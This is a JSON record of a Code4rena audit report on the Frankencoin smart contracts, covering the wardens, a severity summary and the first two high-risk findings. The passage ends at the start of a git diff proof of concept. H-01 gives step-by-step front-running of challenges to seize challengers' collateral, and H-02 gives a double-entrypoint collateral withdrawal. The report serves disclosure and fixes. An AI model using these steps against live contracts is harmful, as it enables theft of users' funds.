{
  "circa": {
    "title": "Frankencoin",
    "sponsor": "Frankencoin",
    "slug": "2023-04-frankencoin",
    "date": "2023-06-09",
    "findings": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues",
    "contest": 231
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit  is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Frankencoin smart contract system written in Solidity. The audit took place between April 12—April 19 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>219 Wardens contributed reports to the Frankencoin:</p>\n<ol>\n<li>0x007</li>\n<li>0x3b</li>\n<li><a href=\"https://twitter.com/3xJanx2009\">0x73696d616f</a></li>\n<li><a href=\"https://twitter.com/0xAgro\">0xAgro</a></li>\n<li><a href=\"https://twitter.com/0xBeirao\">0xBeirao</a></li>\n<li><a href=\"https://twitter.com/0xDACA\">0xDACA</a></li>\n<li>0xNorman</li>\n<li>0xRB</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://twitter.com/Stalin_eth\">0xStalin</a></li>\n<li><a href=\"https://twitter.com/MarioPoneder\">0xTheC0der</a></li>\n<li>0xWaitress</li>\n<li>0xWeiss</li>\n<li>0xbepresent</li>\n<li>0xbrett8571</li>\n<li>0xhacksmithh</li>\n<li>0xkaju</li>\n<li>0xmuxyz</li>\n<li><a href=\"https://twitter.com/0xnevi\">0xnev</a></li>\n<li>117l11</li>\n<li>3dgeville</li>\n<li><a href=\"twitter.com/thre3th\">3th</a></li>\n<li>4710710N</li>\n<li>7siech</li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li>ADM</li>\n<li>Ace-30</li>\n<li><a href=\"https://twitter.com/arzdev\">Arz</a></li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>BGSecurity (<a href=\"https://twitter.com/anonresercher\">anonresercher</a> and <a href=\"https://github.com/martin-petrov03\">martin</a>)</li>\n<li>BPZ (pa6221, Bitcoinfever244, and PrasadLak)</li>\n<li>BRONZEDISC</li>\n<li><a href=\"https://twitter.com/bauchibred?s=21&#x26;t=7sv-1qcnwtkdTA81Iog0yQ\">Bauchibred</a></li>\n<li>Bauer</li>\n<li>BenRai</li>\n<li>BitsOrBytes</li>\n<li>Breeje</li>\n<li><a href=\"https://dream-academy.io/#ChainHunters\">ChainHunters</a> (<a href=\"https://twitter.com/younsle1\">Zer0Luck</a>, junan, hyeon, and nugurii0)</li>\n<li>ChrisTina</li>\n<li><a href=\"https://twitter.com/CodeFoxInc\">CodeFoxInc</a> (<a href=\"https://twitter.com/Markwu_crypto\">thurendous</a>, TerrierLover, and retocrooman)</li>\n<li><a href=\"https://twitter.com/DadeKuma\">DadeKuma</a></li>\n<li><a href=\"https://twitter.com/dedohwale\">DedOhWale</a></li>\n<li>Diana</li>\n<li>DishWasher</li>\n<li>EloiManuel</li>\n<li><a href=\"https://twitter.com/emeduduna\">Emmanuel</a></li>\n<li>Erko</li>\n<li>EvanW</li>\n<li>GreedyGoblin</li>\n<li>HaCk0</li>\n<li>Haipls</li>\n<li>Hama</li>\n<li>IceBear</li>\n<li><a href=\"https://twitter.com/InspexCo\">Inspex</a> (Resistor, jokopoppo, DeStinE21, mimic_f, Rugsurely, ErbaZZ, and rxnnxchxi)</li>\n<li>J4de</li>\n<li><a href=\"https://twitter.com/0xJCN\">JCN</a></li>\n<li>JGcarv</li>\n<li>JcFichtner</li>\n<li>Jerry0x</li>\n<li>Jiamin</li>\n<li>John</li>\n<li><a href=\"https://twitter.com/TamayoNft\">Jorgect</a></li>\n<li>Josiah</li>\n<li><a href=\"https://twitter.com/0xJuntao\">Juntao</a></li>\n<li><a href=\"https://twitter.com/Trungore\">KIntern_NA</a> (<a href=\"https://twitter.com/Trungore\">TrungOre</a> and duc)</li>\n<li><a href=\"https://www.linkedin.com/in/kayode-okunlade-862001142/\">Kaysoft</a></li>\n<li>Kek</li>\n<li>Krace</li>\n<li>Kumpa</li>\n<li><a href=\"https://albertolalanda.com/\">Lalanda</a></li>\n<li>LegendFenGuin</li>\n<li>LeoGold</li>\n<li>LewisBroadhurst</li>\n<li>Lirios</li>\n<li>Madalad</li>\n<li><a href=\"https://milotruck.github.io/\">MiloTruck</a></li>\n<li>MohammedRizwan</li>\n<li>Mukund</li>\n<li>NoamYakov</li>\n<li><a href=\"https://twitter.com/0xcharwak\">Norah</a></li>\n<li><a href=\"https://twitter.com/Nyksx__\">Nyx</a></li>\n<li><a href=\"https://twitter.com/Pronobis4\">PNS</a></li>\n<li>Polaris_tow</li>\n<li><a href=\"https://twitter.com/TheCryptoProxy\">Proxy</a></li>\n<li>Rageur</li>\n<li>Raihan</li>\n<li>RaymondFam</li>\n<li>RedTiger</li>\n<li>ReyAdmirado</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>SAAJ</li>\n<li>SaeedAlipoor01988</li>\n<li>SaharDevep</li>\n<li>SanketKogekar</li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li><a href=\"https://twitter/@Satyam33sharma\">Satyam_Sharma</a></li>\n<li>SolidityATL (plasmablocks and <a href=\"https://twitter.com/wzrdk3lly\">wzrdk3lly</a>)</li>\n<li>SpicyMeatball</li>\n<li>T1MOH</li>\n<li><a href=\"https://twitter.com/ToonVH_\">ToonVH</a></li>\n<li>Tricko</li>\n<li><a href=\"https://github.com/udsene\">Udsen</a></li>\n<li>UniversalCrypto (amaechieth and tettehnetworks)</li>\n<li>V_B (Barichek and vlad_bochok)</li>\n<li><a href=\"https://twitter.com/WorstNi43511849\">W0RR1O</a></li>\n<li>__141345__</li>\n<li><a href=\"https://twitter.com/0xaash\">aashar</a></li>\n<li>ak1</li>\n<li>anodaram</li>\n<li>aria</li>\n<li>ayden</li>\n<li>berlin-101</li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>boredpukar</li>\n<li>btk</li>\n<li>bughunter007</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li><a href=\"https://twitter.com/carlitox477\">carlitox477</a></li>\n<li>carrotsmuggler</li>\n<li><a href=\"https://twitter.com/CatellaTech\">catellatech</a></li>\n<li>cccz</li>\n<li>circlelooper</li>\n<li>codeslide</li>\n<li>crc32</li>\n<li>cryptonue</li>\n<li>d3e4</li>\n<li><a href=\"https://twitter.com/deadrosesxyz\">deadrxsezzz</a></li>\n<li>decade</li>\n<li><a href=\"https://rafal-kalinowski.pl/\">deliriusz</a></li>\n<li>descharre</li>\n<li><a href=\"https://twitter.com/evmboi32\">evmboi32</a></li>\n<li><a href=\"https://twitter.com/eyexploit\">eyexploit</a></li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li>foxb868</li>\n<li><a href=\"https://twitter.com/georgits_\">georgits</a></li>\n<li><a href=\"https://twitter.com/giovannidisiena\">giovannidisiena</a></li>\n<li><a href=\"https://twitter.com/henryxf3\">hihen</a></li>\n<li><a href=\"https://twitter.com/hunt3r_w3b\">hunter_w3b</a></li>\n<li>jangle</li>\n<li>jasonxiale</li>\n<li>jayfromthe13th</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li><a href=\"https://twitter.com/0xJuancito\">juancito</a></li>\n<li>karanctf</li>\n<li>kenta</li>\n<li>kodyvim</li>\n<li><a href=\"https://twitter.com/Xc1008Cui\">ladboy233</a></li>\n<li>lil_eth</li>\n<li>ltyu</li>\n<li><a href=\"https://twitter.com/lukino994\">lukino</a></li>\n<li>lukris02</li>\n<li>m9800</li>\n<li>mahdikarimi</li>\n<li>markus_ether</li>\n<li>marwen</li>\n<li>matrix_0wl</li>\n<li>mov</li>\n<li><a href=\"https://twitter.com/0xpathfindr\">mrpathfindr</a></li>\n<li><a href=\"https://twitter.com/nadin20678790\">nadin</a></li>\n<li><a href=\"https://www.linkedin.com/in/naman-agrawal1778/\">naman1778</a></li>\n<li>niser93</li>\n<li><a href=\"https://twitter.com/nobody20185\">nobody2018</a></li>\n<li>p0wd3r</li>\n<li>parlayan_yildizlar_takimi (<a href=\"https://twitter.com/_ulasanil\">ulas</a> and caglankaan)</li>\n<li><a href=\"https://twitter.com/@PavanKumarKv2\">pavankv</a></li>\n<li><a href=\"https://twitter.com/peak_bolt\">peakbolt</a></li>\n<li>peanuts</li>\n<li>petrichor</li>\n<li><a href=\"https://t.me/pfahard\">pfapostol</a></li>\n<li>pipoca</li>\n<li>pontifex</li>\n<li>qpzm</li>\n<li>ravikiranweb3</li>\n<li>rbserver</li>\n<li>rvierdiiev</li>\n<li><a href=\"https://twitter.com/ryanranran1\">ryanranran</a></li>\n<li>said</li>\n<li>santipu_</li>\n<li>sashik_eth</li>\n<li>sces60107</li>\n<li>sebghatullah</li>\n<li>shalaamum</li>\n<li><a href=\"https://twitter.com/shealtielanz\">shealtielanz</a></li>\n<li>silviaxyz</li>\n<li><a href=\"https://twitter.com/slvDev\">slvDev</a></li>\n<li>smaul0 (smaul and MBabattya)</li>\n<li><a href=\"https://twitter.com/0xSorryNotSorry\">sorrynotsorry</a></li>\n<li>tallo</li>\n<li>tnevler</li>\n<li><a href=\"https://twitter.com/trysam2003\">trysam2003</a></li>\n<li>vakzz</li>\n<li><a href=\"https://twitter.com/0xVolodya\">volodya</a></li>\n<li><a href=\"https://www.market.dev\">wonjun</a></li>\n<li>xmxanuel</li>\n<li>yellowBirdy</li>\n<li><a href=\"https://twitter.com/yixxas\">yixxas</a></li>\n<li><a href=\"https://zaevlad.com/\">zaevlad</a></li>\n<li>zhuXKET</li>\n<li><a href=\"https://www.linkedin.com/in/hamid-abubakr-732901ab/\">zzebra83</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://twitter.com/hansfriese\">hansfriese</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/yadir_lakehal\">yadir</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 21 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 15 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 137 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 43 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-04-frankencoin\">C4 Frankencoin audit repository</a>, and is composed of 10 smart contracts written in the Solidity programming language and includes 949 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-6\" style=\"position:relative;\"><a href=\"#high-risk-findings-6\" aria-label=\"high risk findings 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (6)</h1>\n<h2 id=\"h-01-challenges-can-be-frontrun-with-de-leveraging-to-cause-lossses-for-challengers\" style=\"position:relative;\"><a href=\"#h-01-challenges-can-be-frontrun-with-de-leveraging-to-cause-lossses-for-challengers\" aria-label=\"h 01 challenges can be frontrun with de leveraging to cause lossses for challengers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/945\">[H-01] Challenges can be frontrun with de-leveraging to cause lossses for challengers</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/945\">carrotsmuggler</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/762\">mov</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/660\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/572\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/436\">KIntern_NA</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/306\">Ace-30</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/284\">cccz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/268\">Nyx</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/246\">nobody2018</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/148\">mahdikarimi</a></em></p>\n<p>Challenges, once created, cannot be closed. Thus once a challenge is created, the challenger has already transferred in a collateral amount and is thus open for losing their collateral to a bidding war which will most likely close below market price, since otherwise buying from the market would be cheaper for bidders.</p>\n<p>Position owners can take advantage of this fact and frontrun a <code>launchChallenge</code> transaction with an <code>adjustPrice</code> transaction. The <code>adjustPrice</code> function lets the user lower the price of the position, and can pass the collateral check by sending collateral tokens externally.</p>\n<p>As a worst case scenario, consider a case where a position is open with 1 ETH collateral and 1500 ZCHF minted. A challenger challenges the position and the owner frontruns the challenger by sending the contract 1500 ZCHF and calling <code>repay()</code> and then calling <code>adjustPrice</code> with value 0, all in one transaction with a contract. Now, the price in the contract is set to 0, and the collateral check passes since the outstanding minted amount is 0. The challenger’s transaction gets included next, and they are now bidding away their collateral, since any amount of bid will pass the avert collateral check.</p>\n<p>The position owner themselves can backrun the same transaction with a bid of 1 wei and take all the challenger’s collateral, since every bid checks for the <code>tryAvertChallenge</code> condition.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_bidAmountZCHF</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_collateralAmount</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p>Since price is set to 0, any bid passes this check. This sandwich attack causes immense losses to all challengers in the system, baiting them with bad positions and then sandwiching their challenges.</p>\n<p>Since sandwich attacks are extremely commonplace, this is classified as high severity.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The attack can be performed the following steps.</p>\n<ol>\n<li>Have an undercollateralized position. This can be caused naturally due to market movements.</li>\n<li>Frontrun challenger’s transaction with a repayment and <code>adjustPrice</code> call lowering the price.</li>\n<li>Challenger’s call gets included, where they now put up collateral for bids.</li>\n<li>Backrun challenger’s call with a bid such that it triggers the avert.</li>\n<li>Attacker just claimed the challenger’s collateral at their specified bid price, which can be as little as 1 wei if price is 0.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When launching a challenge, ask for a <code>expectedPrice</code> argument. If the actual price does not match this expected price, that means that transaction was frontrun and should be reverted. This acts like a slippage check for challenges.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/945#issuecomment-1517986753\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>I have some doubts about severity, since the auction’s final bid is expected to be at about the worth of the collateral.\nSo the challenger isn’t expected to lose anything but the challenge reward. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/945#issuecomment-1528893549\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This is actually a high risk issue as the challenge is ended early as soon as the highest bid reaches the liquidation price.</p>\n<p>I would even say that this is one of the most valuable findings I’ve seen so far!</p>\n<p>The fix is to add front-running protection to the launchChallenge function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function launchChallenge(address _positionAddr, uint256 _collateralAmount, uint256 expectedPrice) external validPos(_positionAddr) returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IPosition position = IPosition(_positionAddr);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (position.price() != expectedPrice) revert UnexpectedPrice();</span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/945#issuecomment-1534024991\">hansfriese (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Since the owner lowers the price of the position, the collateral for a challenge is worth nothing, and the challengers might lose their collateral. So I agree with the sponsor.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-double-entrypoint-collateral-token-allows-position-owner-to-withdraw-underlying-collateral-without-repaying-zchf\" style=\"position:relative;\"><a href=\"#h-02-double-entrypoint-collateral-token-allows-position-owner-to-withdraw-underlying-collateral-without-repaying-zchf\" aria-label=\"h 02 double entrypoint collateral token allows position owner to withdraw underlying collateral without repaying zchf permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/886\">[H-02] Double-entrypoint collateral token allows position owner to withdraw underlying collateral without repaying ZCHF</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/886\">giovannidisiena</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/677\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/576\">tallo</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/121\">J4de</a></em></p>\n<p><code>Position::withdraw</code> is intended to allow the position owner to withdraw any ERC20 token which might have ended up at position address. If the collateral address is passed as argument then <code>Position::withdrawCollateral</code> is called to perform the necessary checks and balances. However, this can be bypassed if the collateral token is a double-entrypoint token.</p>\n<p>Such tokens are problematic because the legacy token delegates its logic to the new token, meaning that two separate addresses are used to interact with the same token. Previous examples include TUSD which resulted in <a href=\"https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/\">vulnerability when integrated into Compound</a>. This highlights the importance of carefully selecting the collateral token, especially as this type of vulnerability is not easily detectable. In addition, it is not unrealistic to expect that an upgradeable collateral token could become a double-entrypoint token in the future, e.g. USDT, so this must also be considered.</p>\n<p>This vector involves the position owner dusting the contract with the collateral token’s legacy counterpart which allows them to withdraw the full collateral balance by calling <code>Position::withdraw</code> passing the legacy address as <code>token</code> argument. This behaviour is flawed as the position owner should repay the ZCHF debt before withdrawing their underlying collateral.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Apply the following git diff:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/.gitmodules b/.gitmodules</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 888d42d..e80ffd8 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/.gitmodules</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 